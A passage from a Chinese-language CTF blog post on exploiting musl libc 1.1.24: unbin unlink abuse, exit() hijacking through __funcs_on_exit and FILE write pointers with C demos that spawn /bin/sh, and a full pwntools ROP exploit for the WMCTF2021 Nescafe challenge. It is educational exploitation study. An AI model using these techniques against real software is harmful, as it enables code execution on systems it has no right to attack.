+<h1 id="0x04-利用方式"><a href="#0x04-利用方式" class="headerlink" title="0x04.利用方式"></a>0x04.利用方式</h1><h2 id="0x0401-unbin"><a href="#0x0401-unbin" class="headerlink" title="0x0401.unbin"></a>0x0401.unbin</h2><p>musl1.1.24采用unbin函数从bin中取出chunk，对应glibc中的unlink，但是unbin中检查不足没有检查链表完整性，可以进行利用实现任意地址写。如果泄露了堆地址还可以写rop链进行ROP。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unbin</span><span class="params">(struct chunk *c, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//如果bin中只有一个堆块的话，unbin之后清除binmap</span></span><br><span class="line">	<span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">		a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">    <span class="comment">//链表操作，可以伪造c-&gt;next，需要保证c-&gt;next-&gt;prev可写</span></span><br><span class="line">	c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">	c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">	c-&gt;csize |= C_INUSE;</span><br><span class="line">	NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x0402-利用exit中-funcs-on-exit"><a href="#0x0402-利用exit中-funcs-on-exit" class="headerlink" title="0x0402.利用exit中__funcs_on_exit()"></a>0x0402.利用exit中__funcs_on_exit()</h2><p>exit函数调用的第一个函数就是__funcs_on_exit()。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_Noreturn <span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//exit函数依次调用了四个函数</span></span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COUNT 32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">fl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fl</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="keyword">void</span> (*f[COUNT])(<span class="keyword">void</span> *);</span><br><span class="line">	<span class="keyword">void</span> *a[COUNT];</span><br><span class="line">&#125; builtin, *head;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> slot;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __funcs_on_exit()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span> (*func)(<span class="keyword">void</span> *), *arg;</span><br><span class="line">	LOCK(lock);</span><br><span class="line">	<span class="keyword">for</span> (; head; head=head-&gt;next, slot=COUNT) <span class="keyword">while</span>(slot--&gt;<span class="number">0</span>) &#123;</span><br><span class="line">		func = head-&gt;f[slot];</span><br><span class="line">		arg = head-&gt;a[slot];</span><br><span class="line">		UNLOCK(lock);</span><br><span class="line">		func(arg); <span class="comment">//调用了head-&gt;f[](head-&gt;a[])</span></span><br><span class="line">		LOCK(lock);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在__funcs_on_exit函数中，根据head指针指向的fl结构体中的f[],a[]数组来确定调用的函数和参数。我们可以修改head指针，指向可写的区域，进行伪造fl结构体或者是对head指针指向的区域进行修改，从而执行我们想执行的函数。存在while循环，可以多次执行指定函数</p>
+<p><strong>需要特别注意的是，slot变量为static类型，初始为0</strong>，所以for循环第一次的时候while(slot—&gt;0)会直接提出，for循环第二次head=head-&gt;next的时候赋值slot=COUNT，才会开始执行f[slot]，因此其实伪造的fl结构体要放到head-&gt;next的位置，直接把伪造结构体的next指针设置为自身的地址就可以。</p>
+<p>下面是我写的demo</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//exit()-&gt;__funcs_on_exit()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> binsh[<span class="number">8</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">size_t</span> fakefl = <span class="built_in">malloc</span>(<span class="number">0x208</span>);     <span class="comment">//struct fl结构体大小为0x208 </span></span><br><span class="line">    *(<span class="keyword">size_t</span> *)(fakefl) = fakefl; <span class="comment">//head-&gt;next</span></span><br><span class="line">    *(<span class="keyword">size_t</span> *)(fakefl+<span class="number">0x8</span>+<span class="number">0x8</span>*<span class="number">31</span>) = &amp;system; <span class="comment">//f[31]</span></span><br><span class="line">    *(<span class="keyword">size_t</span> *)(fakefl+<span class="number">0x108</span>+<span class="number">0x8</span>*<span class="number">31</span>) = binsh; <span class="comment">//a[31]</span></span><br><span class="line">    <span class="keyword">size_t</span> libcbase = <span class="number">0x7ffff7d51000</span>;</span><br><span class="line">    <span class="keyword">size_t</span> head = libcbase + <span class="number">0x2acfb8</span>; <span class="comment">//head地址</span></span><br><span class="line">    *(<span class="keyword">size_t</span> *)head = fakefl; <span class="comment">//修改head指针，指向伪造的fl结构体fakefl</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">//触发！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211209160637275.png" alt="image-20211209160637275"></p>
+<h2 id="0x0403-利用exit中-stdio-exit"><a href="#0x0403-利用exit中-stdio-exit" class="headerlink" title="0x0403.利用exit中__stdio_exit()"></a>0x0403.利用exit中__stdio_exit()</h2><p>在musl中，FILE结构体没有vtable，只有3个函数指针，根据在glibc中的经验，如果我们能修改其中的函数指针，并且找到一条函数调用链，控制其中一些参数，就可以攻击利用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *rpos, *rend;</span><br><span class="line">	<span class="keyword">int</span> (*close)(FILE *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *wend, *wpos;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *mustbezero_1;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *wbase;</span><br><span class="line">    <span class="comment">//下面三个函数指针</span></span><br><span class="line">	<span class="keyword">size_t</span> (*read)(FILE *, <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">	<span class="keyword">size_t</span> (*write)(FILE *, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">	<span class="keyword">off_t</span> (*seek)(FILE *, <span class="keyword">off_t</span>, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *buf;</span><br><span class="line">	<span class="keyword">size_t</span> buf_size;</span><br><span class="line">	FILE *prev, *next;</span><br><span class="line">	<span class="keyword">int</span> fd;</span><br><span class="line">	<span class="keyword">int</span> pipe_pid;</span><br><span class="line">	<span class="keyword">long</span> lockcount;</span><br><span class="line">	<span class="keyword">int</span> mode;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> lock;</span><br><span class="line">	<span class="keyword">int</span> lbf;</span><br><span class="line">	<span class="keyword">void</span> *cookie;</span><br><span class="line">	<span class="keyword">off_t</span> off;</span><br><span class="line">	<span class="keyword">char</span> *getln_buf;</span><br><span class="line">	<span class="keyword">void</span> *mustbezero_2;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *shend;</span><br><span class="line">	<span class="keyword">off_t</span> shlim, shcnt;</span><br><span class="line">	FILE *prev_locked, *next_locked;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>这条利用链就在exit函数中<code>exit()-&gt;__stdio_exit()-&gt;close_file()</code>先看exit函数的源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_Noreturn <span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//exit函数依次调用了四个函数</span></span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __stdio_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	<span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">    <span class="comment">//下面会一次关闭三个文件流</span></span><br><span class="line">	close_file(__stdin_used); </span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关键在下面的函数close_file中，如果<code>f-&gt;wpos != f-&gt;wbase</code>，那么就会通过函数指针调用<code>f-&gt;write(f,0,0)</code>。并且FILE结构体指针被放到了rdi寄存器中，如果把write函数指针修改为system，把FILE结构体中的flags修改为binsh，就可以获得shell。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close_file</span><span class="params">(FILE *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//!!!!</span></span><br><span class="line">	<span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>FILE结构体中wpos偏移为0x28, wbase偏移为0x38,write函数指针的偏移为0x48。</p>
+<p>下面是我写的demo，输入字符串为/bin/sh的时候程序会执行system(/bin/sh)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//exit()-&gt;__stdio_exit()-&gt;close_file()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">8</span>]; </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%8s&quot;</span>, s);</span><br><span class="line">    <span class="keyword">size_t</span> victim = <span class="built_in">stdin</span>; <span class="comment">//stdin地址</span></span><br><span class="line">    <span class="built_in">strcpy</span>(victim, s);<span class="comment">//修改flags</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)(victim+<span class="number">0x28</span>) = <span class="number">1</span>; <span class="comment">//修改wpos</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)(victim+<span class="number">0x38</span>) = <span class="number">2</span>; <span class="comment">//修改wbase，需要保证wpos,wbase不相等</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)(victim+<span class="number">0x48</span>) = &amp;system; <span class="comment">//修改write函数指针</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">//触发！</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211208203841534.png" alt="image-20211208203841534"></p>
+<h1 id="0x05-例题"><a href="#0x05-例题" class="headerlink" title="0x05.例题"></a>0x05.例题</h1><p>建议下载源码进行编译可以进行源码级别的调试，运行程序的话，先进行<code>patchelf --set-interpreter libc.so xxxx</code>，然后直接运行文件就可以。</p>
+<h2 id="0x0501-WMCTF2021Nescafe"><a href="#0x0501-WMCTF2021Nescafe" class="headerlink" title="0x0501.WMCTF2021Nescafe"></a>0x0501.WMCTF2021Nescafe</h2><p>题目中UAF，堆块固定大小0x200，只能分配5个，show完之后会把showFlags设置为非零。理论上只能show一次。</p>
+<p><img src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211208193732141.png" alt="image-20211208193732141"></p>
+<p>程序存在静态堆内存区，先查看一下静态堆内存区的位置。<br><img src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211208194141064.png" alt="image-20211208194141064"></p>
+<p>申请chunk的话会优先从大于申请大小的bin中选最小的来，<code>0x7ffff7ffe3b0</code>这个区域会被首先分配，利用UAF就可以泄露libc地址。申请完第一个chunk之后，原本<code>0x7ffff7ffe3b0</code>的chunk会被分割。</p>
+<p>这个题目中exit没有执行，下面代码中前3个函数，直接执行_Exit()，没办法利用exit。只能修改返回地址进行ROP。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_Noreturn <span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>进行ROP的话需要泄露程序基址和栈地址，发现mal结构体中程序段的静态内存和noteList结构体距离很近，<strong>利用unbin修改mal结构体中bin.head的最低字节，从而控制noteList数组</strong>，这样也可以修改showFlag进行多次泄露。</p>
+<p><img src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211208195510399.png" alt="image-20211208195510399"></p>
+<p>修改的时候注意要把<strong>前面bin的head，tail指针设置为0</strong>，就会从这个bin中进行切割。</p>
+<p>通过environ泄露栈地址，堆地址泄露piebase，修改返回地址进行ROP。禁用了execve，要进行orw。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span> </span><br><span class="line">    gdb.attach(p, <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b edit</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">content</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content\n&#x27;</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content\n&#x27;</span>, content)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">create(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x292e50</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase:&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libcbase)))</span><br><span class="line">malbin = libcbase + <span class="number">0x292e00</span></span><br><span class="line">environ = libcbase + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">create(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(malbin)*<span class="number">0x2</span>)</span><br><span class="line">create(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">create(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x68</span>+<span class="string">&#x27;\x30&#x27;</span>)</span><br><span class="line">create(p64(<span class="number">0</span>)*<span class="number">0x6</span>) </span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">piebase = u64(p.recvline()[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x202040</span></span><br><span class="line">log.success(<span class="string">&#x27;piebase: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(piebase)))</span><br><span class="line">edit(<span class="number">0</span>, p64(piebase+<span class="number">0x202040</span>)+p64(environ)+p64(<span class="number">0</span>)*<span class="number">0x4</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">stackaddr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7fffffffe458</span>-<span class="number">0x7fffffffe3e8</span>)</span><br><span class="line">log.success(<span class="string">&#x27;stackaddr: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(stackaddr)))</span><br><span class="line"></span><br><span class="line">R = libcbase + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">O = libcbase + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">W = libcbase + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">poprdi = libcbase + <span class="number">0x0000000000014862</span></span><br><span class="line">poprsi = libcbase + <span class="number">0x000000000001c237</span></span><br><span class="line">poprdx = libcbase + <span class="number">0x000000000001bea2</span></span><br><span class="line"></span><br><span class="line">flag = piebase+<span class="number">0x202200</span></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += flat(poprdi, <span class="number">0</span>, poprsi, flag, poprdx, <span class="number">0x5</span>, R) </span><br><span class="line">rop += flat(poprdi, flag, poprsi, <span class="number">0</span>, O)</span><br><span class="line">rop += flat(poprdi, <span class="number">3</span>, poprsi, flag, poprdx, <span class="number">0x30</span>, R)</span><br><span class="line">rop += flat(poprdi, <span class="number">1</span>, poprsi, flag, poprdx, <span class="number">0x30</span>, W)</span><br><span class="line">edit(<span class="number">0</span>, p64(piebase+<span class="number">0x202040</span>) + p64(stackaddr))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">edit(<span class="number">1</span>, rop)</span><br><span class="line">p.send(<span class="string">&#x27;flag&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06.参考"></a>0x06.参考</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://niebelungen-d.top/2021/08/22/Musl-libc-Pwn-Learning/#exit%E5%8A%AB%E6%8C%81">https://niebelungen-d.top/2021/08/22/Musl-libc-Pwn-Learning/#exit%E5%8A%AB%E6%8C%81</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202253">https://www.anquanke.com/post/id/202253</a></li>
+<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269533.html（关于启动调试musl程序可以参考这个博客）">https://bbs.pediy.com/thread-269533.html（关于启动调试musl程序可以参考这个博客）</a></li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Note/" rel="tag"># Note</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/11/29/2021%E5%AE%89%E5%A4%A9%E6%9D%AFHIT%E9%82%80%E8%AF%B7%E8%B5%9B/" rel="next" title="2021安天杯HIT邀请赛">
+                <i class="fa fa-chevron-left"></i> 2021安天杯HIT邀请赛
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/12/09/NCTF2021%E5%A4%8D%E7%8E%B0/" rel="prev" title="NCTF2021复现">
+                NCTF2021复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://qvb75z5z6.hn-bkt.clouddn.com/1605841888100229.jpeg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
